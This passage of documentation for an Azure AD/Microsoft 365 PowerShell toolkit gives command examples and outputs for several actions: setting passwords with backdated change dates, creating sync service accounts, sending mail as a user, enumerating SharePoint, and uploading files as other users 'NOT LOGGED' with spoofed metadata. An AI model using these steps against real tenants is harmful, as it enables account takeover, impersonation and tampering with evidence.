<span class="nb">Set-AADIntAzureADObject</span> <span class="n">-userPrincipalName</span> <span class="s2">"someone@company.com"</span> <span class="n">-sourceAnchor</span> <span class="s2">"ABC"</span> <span class="n">-netBiosName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>CloudAnchor            : User_d14f7322-c997-4e87-912b-f43c906cec81
ErrorDetails           : ErrorDetails
ObjectType             : User
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : ABC
SyncOperation          : Add
</code></pre>

<h3 id="remove-aadintazureadobject-a">Remove-AADIntAzureADObject (A)</h3>

<p>This function removes an AAD object.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove AAD object</span>
<span class="nb">Remove-AADIntAzureADObject</span> <span class="n">-sourceAnchor</span> <span class="n">ABC</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>CloudAnchor            : User_d14f7322-c997-4e87-912b-f43c906cec81
ErrorDetails           : ErrorDetails
ObjectType             : User
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : ABC
SyncOperation          : Add
</code></pre>

<h3 id="set-aadintazureadgroupmember-a">Set-AADIntAzureADGroupMember (A)</h3>

<p>Adds or removes an Azure AD object to/from the given synchronised group using Azure AD Sync API.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
<span class="c"># Add user to group</span>
<span class="nb">Set-AADIntAzureADGroupMember</span> <span class="n">-GroupCloudAnchor</span> <span class="s2">"Group_0a149b4b-6940-459d-864f-36e0e3a5b3ab"</span> <span class="n">-CloudAnchor</span> <span class="s2">"User_10a9ef8a-8b21-4ba9-abcf-82cf55b884de"</span> <span class="n">-Operation</span> <span class="n">Add</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong></p>

<pre><code>CloudAnchor            : Group_0a149b4b-6940-459d-864f-36e0e3a5b3ab
ErrorDetails           : ErrorDetails
ObjectType             : Group
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : SourceAnchor
SyncOperation          : Set
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
<span class="c"># Add user to group</span>
<span class="nb">Set-AADIntAzureADGroupMember</span> <span class="n">-GroupSourceAnchor</span> <span class="s2">"5p5s0btFu02TjRUAs00FVg=="</span> <span class="n">-SourceAnchor</span> <span class="s2">"cl/bTG5zJku9VynOaXYaeQ=="</span> <span class="n">-Operation</span> <span class="n">Add</span>
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong></p>

<pre><code>CloudAnchor            : Group_0a149b4b-6940-459d-864f-36e0e3a5b3ab
ErrorDetails           : ErrorDetails
ObjectType             : Group
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : 5p5s0btFu02TjRUAs00FVg==
SyncOperation          : Set
</code></pre>

<h3 id="set-aadintuserpassword-a">Set-AADIntUserPassword (A)</h3>

<p>This function sets the user’s password. Also the last change time can be set, must be before the current time.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set the password and the change date to 1/1/1970</span>
<span class="nb">Set-AADIntUserPassword</span> <span class="n">-SourceAnchor</span> <span class="n">qIMPTm2Q3kimHgg4KQyveA</span><span class="p">==</span> <span class="n">-Password</span> <span class="s2">"a"</span> <span class="n">-ChangeDate</span> <span class="n">1</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">1970</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong> (Result 0 = success)</p>

<pre><code>CloudAnchor Result SourceAnchor            
----------- ------ ------------            
CloudAnchor 0      qIMPTm2Q3kimHgg4KQyveA==
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set the password and the change date to 1/1/1970</span>
<span class="nb">Set-AADIntUserPassword</span> <span class="n">-CloudAnchor</span> <span class="s2">"User_60f87269-f258-4473-8cca-267b50110e7a"</span> <span class="n">-Password</span> <span class="s2">"a"</span> <span class="n">-ChangeDate</span> <span class="n">1</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">1970</span>
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong> (Result 0 = success)</p>

<pre><code>CloudAnchor                               Result SourceAnchor            
-----------                               ------ ------------            
User_60f87269-f258-4473-8cca-267b50110e7a 0      SourceAnchor
</code></pre>

<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set the password and the change date to 1/1/1970 and include legacy NTHash</span>
<span class="nb">Set-AADIntUserPassword</span> <span class="n">-SourceAnchor</span> <span class="n">qIMPTm2Q3kimHgg4KQyveA</span><span class="p">==</span> <span class="n">-Password</span> <span class="s2">"a"</span> <span class="n">-ChangeDate</span> <span class="n">1</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">1970</span> <span class="n">-IncludeLegacy</span>
</code></pre></div>
<p></p>

<p><strong>Output 3:</strong> (Result 0 = success)</p>

<pre><code>CloudAnchor                               Result SourceAnchor            
-----------                               ------ ------------            
User_60f87269-f258-4473-8cca-267b50110e7a 0      SourceAnchor
</code></pre>

<h3 id="reset-aadintserviceaccount-a">Reset-AADIntServiceAccount (A)</h3>

<p>This function creates a new service account (or reset the password for existing one). The created user will have <strong>DirectorySynchronizationAccount</strong> role.</p>

<p>Azure AD Connect uses this during the configuration stage to create the service account and stores the username and password to the configuration database.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new service account for AD sync</span>
<span class="nb">Reset-AADIntServiceAccount</span> <span class="n">-ServiceAccount</span> <span class="n">Sync_MyServer_nnnnnnn</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Password         UserName                                          
--------         --------                                          
5(]lCy=Q{.#@lb}p Sync_MyServer_nnnnnnn@company.onmicrosoft.com
</code></pre>

<h2 id="exchange-online-functions">Exchange Online functions</h2>

<p><strong>Eachange Online functions</strong> are used to manipulate devices and send mail using ActiveSync and Outlook APIs.
Functions marked with E uses Exchange Online access token.</p>

<h3 id="get-aadinteasautodiscover">Get-AADIntEASAutoDiscover (*)</h3>

<p>Since version 0.1.6 <br>
Returns endpoints for the given protocol for the given email address. If the email address is invalid (i.e. the user does not exists) this takes ages..</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get endpoint for EWS api</span>
<span class="nb">Get-AADIntEASAutoDiscover</span> <span class="n">-Email</span> <span class="s2">"some.user@company.com"</span> <span class="n">-Protocol</span> <span class="n">Ews</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Protocol  Url                         
--------  ---                         
Substrate https://substrate.office.com
</code></pre>

<h3 id="get-aadinteasautodiscoverv1-e">Get-AADIntEASAutoDiscoverV1 (E)</h3>

<p>Since version 0.1.6 <br>
Returns ActiveSync endpoint for the given user (credentials or access token).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get credentials</span>
<span class="nv">$Cred</span><span class="p">=</span><span class="nb">Get-Credential</span>
<span class="c"># Get endpoint for ActiveSync</span>
<span class="nb">Get-AADIntEASAutoDiscoverV1</span> <span class="n">-Credentials</span> <span class="nv">$Cred</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>https://outlook.office365.com/Microsoft-Server-ActiveSync
</code></pre>

<h3 id="set-aadinteassettings-e">Set-AADIntEASSettings (E)</h3>

<p>Since version 0.1.6 <br>
Adds new or modifies existing ActiveSync device for the given user (credentials or access token).
The added or modified device can be used to send emails with <a href="#send-aadinteasmessage-e">Send-AADIntEASMessage</a></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get credentials</span>
<span class="nv">$Cred</span><span class="p">=</span><span class="nb">Get-Credential</span>
<span class="c"># Create a device</span>
<span class="nb">Set-AADIntEASSettings</span> <span class="n">-Credentials</span> <span class="nv">$Cred</span> <span class="n">-DeviceId</span> <span class="n">android01234</span> <span class="n">-DeviceType</span> <span class="n">Android</span> <span class="n">-Model</span> <span class="s2">"Android 01234"</span> <span class="n">-PhoneNumber</span> <span class="s2">"+1234567890"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong>
</p><div class="highlight"><pre><code class="language-xml" data-lang="xml"><span></span><span class="nt">&lt;Settings</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"Settings"</span><span class="nt">&gt;&lt;Status&gt;</span>1<span class="nt">&lt;/Status&gt;&lt;DeviceInformation&gt;&lt;Status&gt;</span>1<span class="nt">&lt;/Status&gt;&lt;/DeviceInformation&gt;&lt;/Settings&gt;</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintmobiledevices-e">Get-AADIntMobileDevices (E)</h3>

<p>Since version 0.1.6 <br>
Gets mobile devices from Exchange Online.
Devices can be used to send emails with <a href="#send-aadinteasmessage-e">Send-AADIntEASMessage</a></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get credentials</span>
<span class="nv">$Cred</span><span class="p">=</span><span class="nb">Get-Credential</span>
<span class="c"># Get Mobile Devices</span>
<span class="nb">Get-AADIntMobileDevices</span> <span class="n">-Credentials</span> <span class="nv">$Cred</span> <span class="p">|</span> <span class="nb">select </span><span class="n">DeviceId</span><span class="p">,</span><span class="n">DeviceType</span><span class="p">,</span><span class="n">ClientType</span><span class="p">,</span><span class="n">UserDisplayname</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>DeviceId     DeviceType                 ClientType UserDisplayName                                                 
--------     ----------                 ---------- ---------------                                                 
430847304    TestActiveSyncConnectivity EAS        EURP189A002.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizat
android01234 Android                    EAS        EURP189A002.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizat
</code></pre>

<h3 id="send-aadinteasmessage-e">Send-AADIntEASMessage (E)</h3>

<p>Since version 0.1.6 <br>
Sends an email from the given user via ActiveSync using the given device.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get credentials</span>
<span class="nv">$Cred</span><span class="p">=</span><span class="nb">Get-Credential</span>
<span class="c"># Send an email</span>
<span class="nb">Send-AADIntEASMessage</span> <span class="n">-Credentials</span> <span class="nv">$Cred</span> <span class="n">-DeviceId</span> <span class="n">android01234</span> <span class="n">-DeviceType</span> <span class="n">Android</span> <span class="n">-Recipient</span> <span class="s2">"someone@company.com"</span> <span class="n">-Subject</span> <span class="s2">"An email"</span> <span class="n">-Message</span> <span class="s2">"&lt;h2&gt;This is a message!&lt;/h2&gt;"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>WARNING: Message was not Base64 encoded, converting..
</code></pre>

<h3 id="send-aadintoutlookmessage-e">Send-AADIntOutlookMessage (E)</h3>

<p>Since version 0.1.6 <br>
Sends an email from the given user via Outlook API.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get accesstoken</span>
<span class="nv">$At</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForEXO</span>
<span class="c"># Create the email</span>
<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-AccessToken</span> <span class="nv">$At</span> <span class="n">-Recipient</span> <span class="s2">"someone@company.com"</span> <span class="n">-Subject</span> <span class="s2">"An email"</span> <span class="n">-Message</span> <span class="s2">"&lt;h2&gt;This is a message!&lt;/h2&gt;"</span>
</code></pre></div>
<p></p>

<h3 id="open-aadintowa-o">Open-AADIntOWA (O)</h3>

<p>Since version 0.6.2 <br>
Opens OWA in a browser control window as the given user.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get accesstoken</span>
<span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-Resource</span> <span class="s2">"https://outlook.office.com"</span> <span class="n">-SaveToCache</span>

<span class="c"># Open OWA</span>
<span class="nb">Open-AADIntOWA</span>
</code></pre></div>
<p></p>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get accesstoken</span>
<span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-Resource</span> <span class="s2">"https://substrate.office.com"</span> <span class="n">-SaveToCache</span>

<span class="c"># Open OWA</span>
<span class="nb">Open-AADIntOWA</span> <span class="n">-Mode</span> <span class="n">Substrate</span>
</code></pre></div>
<p></p>

<h2 id="sharepoint-online-functions">SharePoint Online functions</h2>

<p><strong>Eachange Online functions</strong> are used to retrieve information of users and groups of SharePoint sites.</p>

<h3 id="get-aadintspositeusers-s">Get-AADIntSPOSiteUsers (S)</h3>

<p>Since version 0.2.4 <br>
Returns users of the given site.  Only visitor (read-access) is needed :)</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get site users</span>
<span class="nv">$ah</span><span class="p">=</span><span class="nb">Get-AADIntSPOAuthenticationHeader</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span>
<span class="nb">Get-AADIntSPOSiteUsers</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span> <span class="n">-AuthHeader</span> <span class="nv">$ah</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>IsSiteAdmin                    : True
Id                             : 17
LoginName                      : c:0t.c|tenant|a200e3ee-47d0-4b9b-99c6-554b85823042
PrincipalType                  : 4
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : 
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : 
NameIdIssuer                   : 
Title                          : SharePoint Service Administrator
Email                          : 

IsSiteAdmin                    : False
Id                             : 1073741823
LoginName                      : SHAREPOINT\system
PrincipalType                  : 1
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : 
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : S-1-0-0
NameIdIssuer                   : urn:offic€:idp:activedirectory
Title                          : System Account
Email                          : 

IsSiteAdmin                    : False
Id                             : 23
LoginName                      : i:0#.f|membership|user@company.com
PrincipalType                  : 1
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : user@company.com
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : 10030000b5466d52
NameIdIssuer                   : urn:federation:microsoftonline
Title                          : user
Email                          : user@company.com
</code></pre>

<h3 id="get-aadintspouserproperties-s">Get-AADIntSPOUserProperties (S)</h3>

<p>Since version 0.2.4 <br>
Returns detailed information of the given user. Only visitor (read-access) is needed :)</p>

<p><strong>Note:</strong> the user’s name must be in SharePoint “LoginName” format as above.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get site users</span>
<span class="nv">$ah</span><span class="p">=</span><span class="nb">Get-AADIntSPOAuthenticationHeader</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span>
<span class="nb">Get-AADIntSPOUserProperties</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span> <span class="n">-AuthHeader</span> <span class="nv">$ah</span> <span class="n">-User</span> <span class="s2">"i:0#.f|membership|user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Updated                            : 2019-08-16T07:59:30Z
Author                             : 
AccountName                        : i:0#.f|membership|user@company.com
DirectReports                      : 
DisplayName                        : user
Email                              : user@company.com
ExtendedManagers                   : 
ExtendedReports                    : i:0#.f|membership|user@company.com
IsFollowed                         : False
Peers                              : 
PersonalUrl                        : https://company-my.sharepoint.com/personal/user_company_com/
PictureURL                         : 
UserUrl                            : https://company-my.sharepoint.com:443/Person.aspx?accountname=i:0#.f|membership|user@company.com
Title                              : 
UserProfile_GUID                   : f6b3014d-c4d7-4775-a37c-1e6f14fa98f9
SID                                : i:0h.f|membership|10030000a5566b50@live.com
ADGuid                             : System.Byte[]
FirstName                          : 
SPS-PhoneticFirstName              : 
LastName                           : 
SPS-PhoneticLastName               : 
PreferredName                      : user
SPS-PhoneticDisplayName            : 
WorkPhone                          : 
Department                         : 
SPS-Department                     : 
Manager                            : 
AboutMe                            : 
PersonalSpace                      : /personal/user_company_com/
UserName                           : user@company.com
QuickLinks                         : 
WebSite                            : 
PublicSiteRedirect                 : 
SPS-JobTitle                       : 
SPS-Dotted-line                    : 
SPS-Peers                          : 
SPS-Responsibility                 : 
SPS-SipAddress                     : user@company.com
SPS-MySiteUpgrade                  : 
SPS-ProxyAddresses                 : 
SPS-HireDate                       : 
SPS-DisplayOrder                   : 
SPS-ClaimID                        : user@company.com
SPS-ClaimProviderID                : membership
SPS-ResourceSID                    : 
SPS-ResourceAccountName            : 
SPS-MasterAccountName              : 
SPS-UserPrincipalName              : user@company.com
SPS-O15FirstRunExperience          : 
SPS-PersonalSiteInstantiationState : 2
SPS-DistinguishedName              : CN=abf7eff8-59a5-456f-a723-976f07b14420,OU=a200e3ee-47d0-4b9b-99c6-554b85823042,OU=Tenants,OU=MSO
                                     nline,DC=SPODS44818354,DC=msoprd,DC=msft,DC=net
SPS-SourceObjectDN                 : 
SPS-ClaimProviderType              : Forms
SPS-SavedAccountName               : SPODS44833354\$JUHIC0-TJJO02Q7PVM2
SPS-SavedSID                       : System.Byte[]
SPS-ObjectExists                   : 
SPS-PersonalSiteCapabilities       : 4
SPS-PersonalSiteFirstCreationTime  : 10/2/2017 5:50:10 PM
SPS-PersonalSiteLastCreationTime   : 10/2/2017 5:50:10 PM
SPS-PersonalSiteNumberOfRetries    : 1
SPS-PersonalSiteFirstCreationError : 
SPS-FeedIdentifier                 : 
WorkEmail                          : user@company.com
CellPhone                          : 
Fax                                : 
HomePhone                          : 
Office                             : 
SPS-Location                       : 
Assistant                          : 
SPS-PastProjects                   : 
SPS-Skills                         : 
SPS-School                         : 
SPS-Birthday                       : 
SPS-StatusNotes                    : 
SPS-Interests                      : 
SPS-HashTags                       : 
SPS-EmailOptin                     : 
SPS-PrivacyPeople                  : True
SPS-PrivacyActivity                : 4095
SPS-PictureTimestamp               : 
SPS-PicturePlaceholderState        : 
SPS-PictureExchangeSyncState       : 
SPS-TimeZone                       : 
OfficeGraphEnabled                 : 
SPS-UserType                       : 0
SPS-HideFromAddressLists           : False
SPS-RecipientTypeDetails           : 
DelveFlags                         : 
msOnline-ObjectId                  : abf7eff8-59a5-456f-a723-976f07b14420
SPS-PointPublishingUrl             : 
SPS-TenantInstanceId               : 
SPS-SharePointHomeExperienceState  : 
SPS-MultiGeoFlags                  : 
PreferredDataLocation              : 
</code></pre>

<h3 id="get-aadintspositegroups-s">Get-AADIntSPOSiteGroups (S)</h3>

<p>Since version 0.2.4 <br>
Returns groups of the given site.  Only visitor (read-access) is needed :)</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get site groups</span>
<span class="nv">$ah</span><span class="p">=</span><span class="nb">Get-AADIntSPOAuthenticationHeader</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span>
<span class="nb">Get-AADIntSPOSiteGroups</span> <span class="n">-Site</span> <span class="n">https</span><span class="p">://</span><span class="n">company</span><span class="p">.</span><span class="n">sharepoint</span><span class="p">.</span><span class="n">com</span> <span class="n">-AuthHeader</span> <span class="nv">$ah</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AllowRequestToJoinLeave        : False
Id                             : 3
LoginName                      : Excel Services Viewers
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : Excel Services Viewers
OwnerTitle                     : System Account

AllowRequestToJoinLeave        : False
Id                             : 19
LoginName                      : SharePointHome OrgLinks Admins
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Admins
OwnerTitle                     : SharePointHome OrgLinks Admins

AllowRequestToJoinLeave        : False
Id                             : 20
LoginName                      : SharePointHome OrgLinks Editors
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Editors
OwnerTitle                     : SharePointHome OrgLinks Editors

AllowRequestToJoinLeave        : False
Id                             : 21
LoginName                      : SharePointHome OrgLinks Viewers
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Viewers
OwnerTitle                     : SharePointHome OrgLinks Admins

AllowRequestToJoinLeave        : False
Id                             : 9
LoginName                      : Team Site Members
AllowMembersEditMembership     : True
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Members
OwnerTitle                     : Team Site Owners

AllowRequestToJoinLeave        : False
Id                             : 7
LoginName                      : Team Site Owners
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Owners
OwnerTitle                     : Team Site Owners

AllowRequestToJoinLeave        : False
Id                             : 8
LoginName                      : Team Site Visitors
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Visitors
OwnerTitle                     : Team Site Owners
</code></pre>

<h3 id="set-aadintspositemembers-s">Set-AADIntSPOSiteMembers (S)</h3>

<p>Since version 0.7.2 <br>
Returns groups of the given site.  Only visitor (read-access) is needed :)</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add user to site</span>
<span class="nv">$auth</span><span class="p">=</span><span class="nb">Get-AADIntSPOAuthenticationHeader</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com"</span>
<span class="nb">Set-AADIntSPOSiteMembers</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com"</span> <span class="n">-AuthHeader</span> <span class="nv">$auth</span> <span class="n">-SiteName</span> <span class="n">CompanyWiki</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>User user@company.com was added to group CompanyWiki!
</code></pre>

<h3 id="export-aadintspositefile-s">Export-AADIntSPOSiteFile (S)</h3>

<p>Since version 0.9.1 <br>
Downloads the given file from SPO.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for SPO and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForSPO</span> <span class="n">-SaveToCache</span>

<span class="c"># Download the file </span>
<span class="nb">Export-AADIntSPOSiteFile</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com/sites/Sales"</span> <span class="n">-RelativePath</span> <span class="s2">"Shared Documents/General/sales.xlsx"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>File saved to sales.xlsx
</code></pre>

<h3 id="add-aadintspositefiles-s">Add-AADIntSPOSiteFiles (S)</h3>

<p>Since version 0.9.1 <br>
Send given file(s) to given SPO site using SharePoint Migration Tool protocol. File additions are NOT LOGGED and metadata can be spoofed.</p>

<p><strong>Note:</strong> Can take up to 10 minutes to complete.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for SPO and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForSPO</span> <span class="n">-SaveToCache</span>

<span class="c"># Send files to SPO site as SHAREPOINT\system</span>
<span class="nb">Add-AADIntSPOSiteFiles</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com/sales"</span> <span class="n">-Folder</span> <span class="s2">"Shared Documents"</span> <span class="n">-Files</span> <span class="s2">"C:\share\Document1.docx"</span><span class="p">,</span><span class="s2">"C:\share\Document2.docx"</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>Sending 2 files as "SHAREPOINT\system" to site "https://company.sharepoint.com/sales/Shared Documents"
11/28/2022 08:59:35.042 JobQueued
11/28/2022 09:01:55.986 JobLogFileCreate
11/28/2022 09:01:56.018 JobStart
11/28/2022 09:01:57.580 JobEnd
2 files (2,322,536 bytes) created.
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for SPO and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForSPO</span> <span class="n">-SaveToCache</span>

<span class="c"># Send files to SPO site as another user and modified timestamps</span>
<span class="nb">Add-AADIntSPOSiteFiles</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com/sales"</span> <span class="n">-Folder</span> <span class="s2">"Shared Documents"</span> <span class="n">-Files</span> <span class="s2">"C:\share\Document1.docx"</span><span class="p">,</span><span class="s2">"C:\share\Document2.docx"</span> <span class="n">-UserName</span> <span class="s2">"user2@company.com"</span> <span class="n">-TimeCreated</span> <span class="s2">"1.1.1970 01:00"</span> <span class="n">-TimeLastModified</span> <span class="s2">"1.1.1970 02:00"</span>
</code></pre></div>
<p></p>

<p><strong>Output2:</strong></p>

<pre><code>Sending 2 files as "i:0#.f|membership|user2@company.com" to site "https://company.sharepoint.com/sales/Shared Documents"
11/28/2022 08:59:35.042 JobQueued
11/28/2022 09:01:55.986 JobLogFileCreate
11/28/2022 09:01:56.018 JobStart
11/28/2022 09:01:57.580 JobEnd
2 files (2,322,536 bytes) created.
</code></pre>

<h3 id="update-aadintspositefile-s">Update-AADIntSPOSiteFile (S)</h3>

<p>Since version 0.9.1 <br>
Replaces an existing file in SPO site with the given file using SharePoint Migration Tool protocol. File modifications are NOT LOGGED and metadata can be spoofed.</p>

<p><strong>Note:</strong> Can take up to 10 minutes to complete.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for SPO and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForSPO</span> <span class="n">-SaveToCache</span>

<span class="c"># Send files to SPO site as current document author</span>
<span class="nb">Update-AADIntSPOSiteFile</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com/sales"</span> <span class="n">-RelativePath</span> <span class="s2">"Shared Documents/Document1.docx"</span> <span class="o">-File</span> <span class="s2">"UpdatedDocument.docx"</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>Sending 1 files as "i:0#.f|membership|user1@company.com" to site "https://company.sharepoint.com/sales/Shared Documents"
11/28/2022 08:59:35.042 JobQueued
11/28/2022 09:01:55.986 JobLogFileCreate
11/28/2022 09:01:56.018 JobStart
11/28/2022 09:01:57.580 JobEnd
1 files (322,536 bytes) created.
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for SPO and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForSPO</span> <span class="n">-SaveToCache</span>

<span class="c"># Send files to SPO site as another user and modified timestamps</span>
<span class="nb">Update-AADIntSPOSiteFile</span> <span class="n">-Site</span> <span class="s2">"https://company.sharepoint.com/sales"</span> <span class="n">-RelativePath</span> <span class="s2">"Shared Documents/Document1.docx"</span> <span class="o">-File</span> <span class="s2">"UpdatedDocument.docx"</span> <span class="n">-UserName</span> <span class="s2">"user2@company.com"</span> <span class="n">-TimeCreated</span> <span class="s2">"1.1.1970 01:00"</span> <span class="n">-TimeLastModified</span> <span class="s2">"1.1.1970 02:00"</span>
</code></pre></div>
<p></p>

<p><strong>Output2:</strong></p>

<pre><code>Sending 1 files as "i:0#.f|membership|user2@company.com" to site "https://company.sharepoint.com/sales/Shared Documents"
11/28/2022 08:59:35.042 JobQueued
11/28/2022 09:01:55.986 JobLogFileCreate
11/28/2022 09:01:56.018 JobStart
11/28/2022 09:01:57.580 JobEnd
1 files (322,536 bytes) created.
</code></pre>

